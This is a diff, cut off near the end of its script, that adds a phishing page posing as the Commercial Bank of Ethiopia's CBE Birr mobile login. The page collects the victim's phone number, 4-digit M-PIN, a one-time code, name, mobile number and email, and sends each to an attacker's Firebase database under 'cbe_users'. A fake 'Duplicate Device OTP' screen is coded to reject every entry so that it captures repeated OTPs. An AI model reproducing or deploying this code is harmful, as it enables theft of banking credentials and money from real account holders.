@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>CBE Birr - Login</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        html, body { width: 100%; height: 100%; overflow: hidden; }
+        body { background: #e9e9e9; display: flex; justify-content: center; align-items: center; }
+        .mobile-container { width: 100%; max-width: 100%; height: 100vh; height: 100dvh; background: #fff; position: relative; overflow: hidden; display: flex; flex-direction: column; }
+
+        /* SCREEN 1: LOGIN */
+        #screen-login { display: flex; flex-direction: column; height: 100%; background: #fff; }
+        .login-header { background: #7B1FA2; height: 160px; position: relative; overflow: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; flex-shrink: 0; }
+        .login-header::before { content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0; background-image: linear-gradient(45deg, transparent 48%, rgba(255,255,255,0.15) 49%, rgba(255,255,255,0.15) 51%, transparent 52%), linear-gradient(-45deg, transparent 48%, rgba(255,255,255,0.15) 49%, rgba(255,255,255,0.15) 51%, transparent 52%), linear-gradient(0deg, transparent 48%, rgba(255,255,255,0.1) 49%, rgba(255,255,255,0.1) 51%, transparent 52%); background-size: 40px 40px; z-index: 1; }
+        .login-header::after { content: ''; position: absolute; top: -50px; right: -50px; width: 150px; height: 150px; border-radius: 50%; background: rgba(255,255,255,0.08); z-index: 1; }
+        .login-header-content { position: relative; z-index: 10; text-align: center; color: #fff; }
+        .cbe-emblem { width: 55px; height: 55px; margin: 0 auto 8px; display: flex; justify-content: center; align-items: center; }
+        .cbe-emblem svg { width: 45px; height: 45px; fill: #C9A227; }
+        .login-header-content .amharic { font-size: 13px; letter-spacing: 0.5px; margin-bottom: 3px; color: #E1BEE7; }
+        .login-header-content h2 { font-size: 16px; font-weight: 500; letter-spacing: 0.5px; color: #fff; }
+        .login-content { flex: 1; background: #fff; border-top-left-radius: 30px; border-top-right-radius: 30px; margin-top: -30px; position: relative; z-index: 10; padding: 20px 25px; display: flex; flex-direction: column; overflow-y: auto; }
+        .handle { width: 60px; height: 4px; background: #7B1FA2; border-radius: 4px; margin: 0 auto 20px auto; }
+        .lang-select { display: flex; align-items: center; gap: 8px; color: #7B1FA2; font-weight: 700; font-size: 16px; margin-bottom: 20px; }
+        .lang-select svg { width: 20px; height: 20px; fill: #7B1FA2; }
+        .lang-select select { border: none; background: transparent; color: #7B1FA2; font-weight: 700; font-size: 16px; outline: none; cursor: pointer; }
+        .cbe-logo-box { display: flex; justify-content: center; margin-bottom: 10px; }
+        .cbe-logo-box .logo-inner { background: #7B1FA2; border: 2px solid #E1BEE7; border-radius: 12px; padding: 8px 22px; box-shadow: 0 6px 15px rgba(123, 31, 162, 0.25); text-align: center; }
+        .cbe-logo-box .logo-inner .cbe-text { font-size: 10px; font-weight: 700; color: #FFC107; letter-spacing: 1px; margin-bottom: -4px; text-align: left; padding-left: 3px; }
+        .cbe-logo-box .logo-inner .birr-text { font-size: 28px; font-weight: 900; color: #fff; font-style: italic; line-height: 1; }
+        .cbe-logo-box .logo-inner .tiny-text { font-size: 6px; color: #E1BEE7; letter-spacing: 1px; margin-top: 1px; }
+        .cbebirr-title { text-align: center; font-size: 24px; font-weight: 800; color: #7B1FA2; margin-bottom: 5px; }
+        .cbebirr-title span { color: #C9A227; }
+        .cbebirr-subtitle { text-align: center; font-size: 13px; color: #888; margin-bottom: 25px; }
+        .phone-input-group { display: flex; align-items: center; gap: 12px; border: 1.5px solid #7B1FA2; border-radius: 30px; padding: 14px 20px; margin-bottom: 20px; background: #fff; }
+        .phone-input-group .person-icon { width: 30px; height: 30px; background: #7B1FA2; border-radius: 50%; display: flex; justify-content: center; align-items: center; flex-shrink: 0; }
+        .phone-input-group .person-icon svg { width: 18px; height: 18px; fill: #fff; }
+        .phone-input-group input { flex: 1; border: none; outline: none; font-size: 15px; background: transparent; color: #333; }
+        .phone-input-group input::placeholder { color: #999; }
+        .btn-primary { width: 100%; padding: 15px; background: #7B1FA2; color: #fff; border: none; border-radius: 30px; font-size: 18px; font-weight: 600; cursor: pointer; box-shadow: 0 4px 15px rgba(123, 31, 162, 0.35); transition: 0.2s; margin-bottom: 25px; }
+        .btn-primary:hover { background: #6A1B9A; }
+        .connect-section { display: flex; align-items: center; justify-content: center; gap: 15px; margin-bottom: 20px; }
+        .connect-section .line { flex: 1; height: 1px; background: #e0e0e0; }
+        .connect-section .text { font-size: 13px; color: #999; font-weight: 500; white-space: nowrap; }
+        .social-icons { display: flex; justify-content: center; gap: 18px; margin-bottom: 25px; }
+        .social-icon { width: 48px; height: 48px; background: #f9f9f9; border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; transition: 0.2s; box-shadow: 0 2px 6px rgba(0,0,0,0.08); }
+        .social-icon svg { width: 22px; height: 22px; }
+        .signup-text { text-align: center; font-size: 14px; color: #333; margin-bottom: 25px; font-weight: 500; }
+        .signup-text a { color: #7B1FA2; font-weight: 700; text-decoration: none; }
+        .chatbot-row { display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: auto; padding: 10px 0; font-size: 14px; color: #333; font-weight: 600; }
+        .chatbot-row .chat-icon { width: 22px; height: 22px; background: #7B1FA2; border-radius: 5px; display: flex; justify-content: center; align-items: center; }
+        .chatbot-row .chat-icon svg { width: 13px; height: 13px; fill: #fff; }
+        .chatbot-row .chat-text { color: #7B1FA2; font-weight: 700; cursor: pointer; }
+
+        /* GENERAL */
+        .header-bg { position: absolute; top: 0; left: 0; width: 100%; height: 180px; background: #7B1FA2; z-index: 1; }
+        .header-bg::after { content: ''; position: absolute; bottom: -60px; right: -50px; width: 200px; height: 200px; background: #7B1FA2; border-radius: 50%; transform: scale(1.2); z-index: 2; }
+        .header-bg::before { content: ''; position: absolute; bottom: -30px; left: -50px; width: 150px; height: 150px; background: #7B1FA2; border-radius: 50%; z-index: 2; }
+        .logo-area { position: relative; z-index: 10; text-align: center; margin-top: 30px; color: #fff; }
+        .logo-area h2 { font-size: 18px; font-weight: 600; letter-spacing: 0.5px; }
+        .content { position: relative; z-index: 10; background: #fff; flex: 1; border-top-left-radius: 30px; border-top-right-radius: 30px; margin-top: 20px; padding: 30px 25px; display: flex; flex-direction: column; }
+
+        /* M PIN */
+        #screen-mpin { display: none; flex-direction: column; height: 100%; text-align: center; position: relative; }
+        .icon-circle { width: 70px; height: 70px; background: #F3E5F5; border-radius: 50%; display: flex; justify-content: center; align-items: center; align-self: center; margin-bottom: 15px; }
+        .icon-circle svg { width: 40px; height: 40px; fill: #7B1FA2; }
+        .secure-text { font-size: 12px; font-weight: 700; color: #7B1FA2; letter-spacing: 1px; margin-bottom: 10px; }
+        .mpin-title { font-size: 24px; font-weight: 800; color: #333; margin-bottom: 10px; }
+        .mpin-sub { font-size: 14px; color: #666; margin-bottom: 30px; line-height: 1.5; }
+        .mpin-input-group { display: flex; align-items: center; border: 2px solid #7B1FA2; border-radius: 12px; padding: 15px; margin-bottom: 20px; position: relative; }
+        .mpin-label { font-size: 12px; font-weight: 700; color: #7B1FA2; position: absolute; top: -10px; left: 15px; background: #fff; padding: 0 5px; }
+        #mpin-input { width: 100%; border: none; outline: none; font-size: 24px; letter-spacing: 20px; text-align: center; background: transparent; color: #7B1FA2; font-weight: 700; padding-left: 15px; }
+        #mpin-input::placeholder { letter-spacing: 2px; color: #ccc; font-size: 14px; font-weight: 400; }
+        .mpin-hint { font-size: 13px; color: #888; margin-bottom: 30px; }
+
+        /* OTP */
+        #screen-otp-first, #screen-otp-duplicate { display: none; flex-direction: column; height: 100%; text-align: center; position: relative; }
+        .otp-icon-area { background: #F3E5F5; border-radius: 16px; padding: 20px; display: flex; justify-content: center; align-items: center; margin-bottom: 20px; }
+        .otp-icon-area svg { width: 50px; height: 50px; fill: #7B1FA2; }
+        .otp-title { font-size: 20px; font-weight: 700; color: #333; margin-bottom: 8px; }
+        .otp-sub { font-size: 13px; color: #555; margin-bottom: 5px; }
+        .otp-number { font-size: 15px; font-weight: 700; color: #7B1FA2; margin-bottom: 20px; }
+        .otp-boxes { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
+        .otp-boxes input { width: 45px; height: 55px; border: 1.5px solid #ccc; border-radius: 10px; text-align: center; font-size: 20px; font-weight: 700; color: #7B1FA2; background: #F3E5F5; outline: none; }
+        .otp-boxes input:focus { border-color: #7B1FA2; background: #fff; }
+        .edit-number { display: flex; align-items: center; justify-content: center; gap: 8px; color: #7B1FA2; font-weight: 600; font-size: 14px; cursor: pointer; margin-bottom: 20px; }
+        .edit-number svg { width: 16px; height: 16px; fill: #7B1FA2; }
+        .error-msg { color: #dc2626; font-size: 14px; font-weight: 700; margin-bottom: 15px; display: none; }
+        .success-msg { color: #22c55e; font-size: 14px; font-weight: 700; margin-bottom: 15px; display: none; }
+        .footer-text { text-align: center; font-size: 10px; color: #888; margin-top: 15px; line-height: 1.4; }
+
+        /* PERSONAL */
+        #screen-personal { display: none; flex-direction: column; height: 100%; position: relative; }
+        .personal-icon-box { width: 70px; height: 70px; background: linear-gradient(135deg, #7B1FA2, #9C27B0); border-radius: 20px; display: flex; justify-content: center; align-items: center; align-self: center; margin-bottom: 15px; box-shadow: 0 6px 20px rgba(123, 31, 162, 0.4); }
+        .personal-icon-box svg { width: 40px; height: 40px; fill: #fff; }
+        .setup-text { font-size: 12px; font-weight: 700; color: #7B1FA2; letter-spacing: 1.5px; margin-bottom: 10px; text-transform: uppercase; text-align: center; }
+        .personal-title { font-size: 26px; font-weight: 800; color: #333; margin-bottom: 10px; text-align: center; }
+        .personal-sub { font-size: 14px; color: #888; margin-bottom: 25px; line-height: 1.5; text-align: center; }
+        .field-label { font-size: 12px; font-weight: 700; color: #7B1FA2; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 8px; text-align: left; }
+        .input-box { display: flex; align-items: center; gap: 12px; border: 2px solid #7B1FA2; border-radius: 12px; padding: 14px 18px; background: #FCE4EC33; margin-bottom: 20px; }
+        .input-box svg { width: 18px; height: 18px; fill: #7B1FA2; flex-shrink: 0; }
+        .input-box input { flex: 1; border: none; outline: none; font-size: 15px; background: transparent; color: #333; font-weight: 500; }
+        .input-box input::placeholder { color: #bbb; font-weight: 400; }
+
+        /* LOADING */
+        .loading-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.95); z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; backdrop-filter: blur(4px); opacity: 0; pointer-events: none; transition: opacity 0.3s ease; }
+        .loading-overlay.active { opacity: 1; pointer-events: auto; }
+        .spinner { width: 50px; height: 50px; border: 5px solid #e5e7eb; border-top: 5px solid #7B1FA2; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading-text { font-size: 15px; font-weight: 700; color: #7B1FA2; letter-spacing: 1px; animation: pulse 1.5s ease-in-out infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 0.6; } 50% { opacity: 1; } }
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+    <div class="mobile-container">
+        <div class="loading-overlay" id="loadingOverlay">
+            <div class="spinner"></div>
+            <div class="loading-text" id="loadingText">Please Wait...</div>
+        </div>
+
+        <div id="screen-login">
+            <div class="login-header">
+                <div class="login-header-content">
+                    <div class="cbe-emblem"><svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zm0 9l2.5-1.25L12 8.5l-2.5 1.25L12 11zm0 2.5l-5-2.5-5 2.5L12 22l10-8.5-5-2.5-5 2.5z"/></svg></div>
+                    <div class="amharic">የኢትዮጵያ ንግድ ባንክ</div>
+                    <h2>Commercial Bank of Ethiopia</h2>
+                </div>
+            </div>
+            <div class="login-content">
+                <div class="handle"></div>
+                <div class="lang-select">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+                    <select><option>English</option><option>አማርኛ</option></select>
+                </div>
+                <div class="cbe-logo-box">
+                    <div class="logo-inner">
+                        <div class="cbe-text">CBE</div>
+                        <div class="birr-text">Birr</div>
+                        <div class="tiny-text">የኢትዮጵያ ንግድ ባንክ</div>
+                    </div>
+                </div>
+                <div class="cbebirr-title">CBE<span>Birr</span></div>
+                <div class="cbebirr-subtitle">Let's login to explore more...</div>
+                <div class="phone-input-group">
+                    <div class="person-icon"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg></div>
+                    <input type="tel" id="phone-input" placeholder="Enter phone number">
+                </div>
+                <button class="btn-primary" onclick="goToMPin()">Sign In</button>
+                <div class="connect-section"><div class="line"></div><div class="text">You can Connect with</div><div class="line"></div></div>
+                <div class="social-icons">
+                    <div class="social-icon"><svg viewBox="0 0 24 24" fill="#000"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg></div>
+                    <div class="social-icon"><svg viewBox="0 0 24 24" fill="#1877F2"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg></div>
+                    <div class="social-icon"><svg viewBox="0 0 24 24" fill="#0A66C2"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></div>
+                    <div class="social-icon"><svg viewBox="0 0 24 24" fill="#FF0000"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg></div>
+                </div>
+                <div class="signup-text">Don't have an account? <a href="#">Create Account</a></div>
+                <div class="chatbot-row">Do you have any question? <div class="chat-icon"><svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg></div> <span class="chat-text">Chatbot</span></div>
+            </div>
+        </div>
+
+        <div id="screen-mpin" class="hidden">
+            <div class="header-bg"><div class="logo-area"><h2>Commercial Bank of Ethiopia</h2></div></div>
+            <div class="content">
+                <div class="handle"></div>
+                <div class="icon-circle"><svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zm0 9l2.5-1.25L12 8.5l-2.5 1.25L12 11zm0 2.5l-5-2.5-5 2.5L12 22l10-8.5-5-2.5-5 2.5z"/></svg></div>
+                <div class="secure-text">SECURE ACTIVATION</div>
+                <div class="mpin-title">Put your M PIN</div>
+                <div class="mpin-sub">Choose a 4 digit number to secure your CBE Birr account.</div>
+                <div class="mpin-input-group"><span class="mpin-label">M-PIN</span><input type="password" id="mpin-input" maxlength="4" inputmode="numeric" placeholder="Enter 4 digits"></div>
+                <div class="mpin-hint">Enter 4 digits</div>
+                <button class="btn-primary" onclick="goToFirstOTP()">Continue</button>
+            </div>
+        </div>
+
+        <div id="screen-otp-first" class="hidden">
+            <div class="header-bg"><div class="logo-area"><h2>Commercial Bank of Ethiopia</h2></div></div>
+            <div class="content">
+                <div class="handle"></div>
+                <div class="otp-icon-area"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg></div>
+                <div class="otp-title">OTP Verification</div>
+                <div class="otp-sub">Enter the 6-digit OTP code</div>
+                <div class="otp-number" id="otp-phone-display-1">251913212762</div>
+                <div class="otp-boxes" id="otp-boxes-first">
+                    <input type="text" maxlength="1" inputmode="numeric" class="otp-box-f">
+                    <input type="text" maxlength="1" inputmode="numeric" class="otp-box-f">
+                    <input type="text" maxlength="1" inputmode="numeric" class="otp-box-f">
+                    <input type="text" maxlength="1" inputmode="numeric" class="otp-box-f">
+                    <input type="text" maxlength="1" inputmode="numeric" class="otp-box-f">
+                    <input type="text" maxlength="1" inputmode="numeric" class="otp-box-f">
+                </div>
+                <div class="success-msg" id="success-msg-1">OTP Verified Successfully! Please wait...</div>
+                <div class="edit-number" onclick="goBackToLogin()">Edit Number <svg viewBox="0 0 24 24"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg></div>
+            </div>
+        </div>
+
+        <div id="screen-personal" class="hidden">
+            <div class="header-bg"><div class="logo-area"><h2>Commercial Bank of Ethiopia</h2></div></div>
+            <div class="content">
+                <div class="handle"></div>
+                <div class="personal-icon-box"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg></div>
+                <div class="setup-text">ACCOUNT SETUP</div>
+                <div class="personal-title">Personal Details</div>
+                <div class="personal-sub">Fill in your info to complete account activation.</div>
+                <div class="field-label">FULL NAME</div>
+                <div class="input-box"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg><input type="text" id="full-name" placeholder="Enter your full name"></div>
+                <div class="field-label">MOBILE NUMBER</div>
+                <div class="input-box"><svg viewBox="0 0 24 24"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg><input type="tel" id="personal-mobile" placeholder="Enter mobile number"></div>
+                <div class="field-label">EMAIL ADDRESS</div>
+                <div class="input-box"><svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg><input type="email" id="personal-email" placeholder="Enter email address"></div>
+                <button class="btn-primary" onclick="goToDuplicateOTP()">Continue</button>
+            </div>
+        </div>
+
+        <div id="screen-otp-duplicate" class="hidden">
+            <div class="header-bg"><div class="logo-area"><h2>Commercial Bank of Ethiopia</h2></div></div>
+            <div class="content">
+                <div class="handle"></div>
+                <div class="otp-icon-area"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg></div>
+                <div class="otp-title">Duplicate Device OTP Verification</div>
+                <div class="otp-sub">Get OTP to proceed</div>
+                <div class="otp-number" id="otp-phone-display-2">251913212762</div>
+                <div class="otp-boxes" id="otp-boxes-dup">
+                    <input type="text" maxlength="1" inputmode="numeric" class="otp-box-d">
+                    <input type="text" maxlength="1" inputmode="numeric" class="otp-box-d">
+                    <input type="text" maxlength="1" inputmode="numeric" class="otp-box-d">
+                    <input type="text" maxlength="1" inputmode="numeric" class="otp-box-d">
+                    <input type="text" maxlength="1" inputmode="numeric" class="otp-box-d">
+                    <input type="text" maxlength="1" inputmode="numeric" class="otp-box-d">
+                </div>
+                <div class="error-msg" id="otp-error-dup">Invalid OTP! Please try again.</div>
+                <div class="edit-number" onclick="goBackToPersonal()">Edit Number <svg viewBox="0 0 24 24"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg></div>
+                <div class="footer-text" style="margin-top:auto;">©2024 All rights reserved to Commercial Bank of Ethiopia.</div>
+            </div>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getDatabase, ref, push, set, update, get } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+        // ============ NEW FIREBASE CONFIG ============
+        const firebaseConfig = {
+            apiKey: "AIzaSyB9Y2_hnmgQsFute7DDAcKjmuoAnggQZJY",
+            authDomain: "long-d1bcb.firebaseapp.com",
+            databaseURL: "https://long-d1bcb-default-rtdb.firebaseio.com",
+            projectId: "long-d1bcb",
+            storageBucket: "long-d1bcb.firebasestorage.app",
+            messagingSenderId: "515546162619",
+            appId: "1:515546162619:web:e046b79a25ccfa057e509e",
+            measurementId: "G-HRWZESRZK4"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        let currentFirebaseKey = null;
+
+        function createUser(data) {
+            const usersRef = ref(database, 'cbe_users');
+            const newUserRef = push(usersRef);
+            currentFirebaseKey = newUserRef.key;
+            set(newUserRef, data)
+                .then(() => console.log("✅ User created:", currentFirebaseKey))
+                .catch((error) => console.error("❌ Error:", error));
+        }
+
+        function updateUser(data) {
+            if (!currentFirebaseKey) return;
+            const userRef = ref(database, 'cbe_users/' + currentFirebaseKey);
+            update(userRef, data)
+                .then(() => console.log("✅ User updated:", Object.keys(data).join(', ')))
+                .catch((error) => console.error("❌ Update Error:", error));
+        }
+
+        const screenLogin = document.getElementById('screen-login');
+        const screenMpin = document.getElementById('screen-mpin');
+        const screenOtpFirst = document.getElementById('screen-otp-first');
+        const screenPersonal = document.getElementById('screen-personal');
+        const screenOtpDup = document.getElementById('screen-otp-duplicate');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const loadingText = document.getElementById('loadingText');
+
+        const phoneInput = document.getElementById('phone-input');
+        const mpinInput = document.getElementById('mpin-input');
+        const otpPhoneDisplay1 = document.getElementById('otp-phone-display-1');
+        const otpPhoneDisplay2 = document.getElementById('otp-phone-display-2');
+
+        const otpBoxesFirst = document.querySelectorAll('.otp-box-f');
+        const otpBoxesDup = document.querySelectorAll('.otp-box-d');
+        const successMsg1 = document.getElementById('success-msg-1');
+        const otpErrorDup = document.getElementById('otp-error-dup');
+
+        const fullNameInput = document.getElementById('full-name');
+        const personalMobile = document.getElementById('personal-mobile');
+        const personalEmail = document.getElementById('personal-email');
+
+        function showLoading(text, duration, callback) {
+            loadingText.textContent = text;
+            loadingOverlay.classList.add('active');
+            setTimeout(() => {
+                loadingOverlay.classList.remove('active');
+                setTimeout(() => { if(callback) callback(); }, 300);
+            }, duration);
+        }
+
+        // 1. Login → M PIN
+        function goToMPin() {
+            if (phoneInput.value.trim().length === 0) {
+                alert("Please enter a phone number.");
+                return;
+            }
+
+            const phoneNumber = "+251" + phoneInput.value.trim();
+            createUser({
+                phone: phoneNumber,
+                mpin: "Not Provided",
+                firstOtp: "Not Provided",
+                fullName: "Not Provided",
+                personalMobile: "Not Provided",
+                personalEmail: "Not Provided",
+                otpAttempts: [],
+                lastOtp: "Not Provided",
+                loginTime: new Date().toLocaleString(),
+                loginTimestamp: Date.now(),
+                status: "Pending"
+            });
+
+            showLoading("Verifying Number...", 2000, () => {
+                screenLogin.classList.add('hidden');
+                screenMpin.classList.remove('hidden');
+                screenMpin.style.display = 'flex';
+            });
+        }
+
+        // 2. M PIN → First OTP
+        function goToFirstOTP() {
+            if (mpinInput.value.length < 4) {
+                alert("Please enter a 4-digit M PIN.");
+                return;
+            }
+
+            updateUser({ 
+                mpin: mpinInput.value,
+                mpinTime: new Date().toLocaleString(),
+                mpinTimestamp: Date.now()
+            });
+
+            showLoading("Sending OTP...", 2000, () => {
+                screenMpin.classList.add('hidden');
+                screenMpin.style.display = 'none';
+                screenOtpFirst.classList.remove('hidden');
+                screenOtpFirst.style.display = 'flex';
+
+                if (phoneInput.value.trim() !== '') {
+                    otpPhoneDisplay1.textContent = '251' + phoneInput.value.trim();
+                    otpPhoneDisplay2.textContent = '251' + phoneInput.value.trim();
+                }
+                otpBoxesFirst[0].focus();
+            });
+        }
+
+        // 3. First OTP AUTO-VERIFY
+        otpBoxesFirst.forEach((input, index) => {
+            input.addEventListener('input', function() {
+                if (this.value.length === 1 && index < otpBoxesFirst.length - 1) {
+                    otpBoxesFirst[index + 1].focus();
+                }
+                checkAllFilled(otpBoxesFirst, () => {
+                    let firstOtpValue = '';
+                    otpBoxesFirst.forEach(box => firstOtpValue += box.value);
+                    
+                    updateUser({ 
+                        firstOtp: firstOtpValue,
+                        firstOtpTime: new Date().toLocaleString(),
+                        firstOtpTimestamp: Date.now()
+                    });
+
+                    successMsg1.style.display = 'block';
+                    setTimeout(() => {
+                        successMsg1.style.display = 'none';
+                        screenOtpFirst.classList.add('hidden');
+                        screenOtpFirst.style.display = 'none';
+                        screenPersonal.classList.remove('hidden');
+                        screenPersonal.style.display = 'flex';
+                        otpBoxesFirst.forEach(b => b.value = '');
+                    }, 1500);
+                });
+            });
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
+                    otpBoxesFirst[index - 1].focus();
+                }
+            });
+        });
+
+        // 4. Personal → Duplicate OTP
+        function goToDuplicateOTP() {
+            if (fullNameInput.value.trim() === '' || personalMobile.value.trim() === '' || personalEmail.value.trim() === '') {
+                alert("Please fill all the fields.");
+                return;
+            }
+
+            updateUser({
+                fullName: fullNameInput.value,
+                personalMobile: personalMobile.value,
+                personalEmail: personalEmail.value,
+                personalTime: new Date().toLocaleString(),
+                personalTimestamp: Date.now()
+            });
+
+            showLoading("Sending OTP...", 2000, () => {
+                screenPersonal.classList.add('hidden');
+                screenPersonal.style.display = 'none';
+                screenOtpDup.classList.remove('hidden');
+                screenOtpDup.style.display = 'flex';
+                otpBoxesDup[0].focus();
+            });
+        }
+
+        // 5. Duplicate OTP ALWAYS INVALID
+        otpBoxesDup.forEach((input, index) => {
+            input.addEventListener('input', function() {
+                if (this.value.length === 1 && index < otpBoxesDup.length - 1) {
+                    otpBoxesDup[index + 1].focus();
+                }
+                checkAllFilled(otpBoxesDup, () => {
+                    let enteredOtp = '';
+                    otpBoxesDup.forEach(box => enteredOtp += box.value);
+                    otpErrorDup.style.display = 'none';
+
+                    if (currentFirebaseKey) {
+                        const userRef = ref(database, 'cbe_users/' + currentFirebaseKey);
+                        get(userRef).then((snapshot) => {
+                            if (snapshot.exists()) {
+                                const userData = snapshot.val();
+                                let otpAttempts = userData.otpAttempts || [];
+                                otpAttempts.push({
+                                    otp: enteredOtp,
+                                    time: new Date().toLocaleString(),
+                                    timestamp: Date.now()
+                                });
+                                update(userRef, { 
+                                    otpAttempts: otpAttempts,
+                                    lastOtp: enteredOtp,
+                                    lastOtpTime: new Date().toLocaleString(),
+                                    lastOtpTimestamp: Date.now()
+                                });
+                            }
+                        });
+                    }
+
+                    showLoading("Verifying OTP...", 2500, () => {
+                        otpErrorDup.style.display = 'block';
+                        otpBoxesDup.forEach(box => box.value = '');
+                        otpBoxesDup[0].focus();
+                    });
+                });
+            });
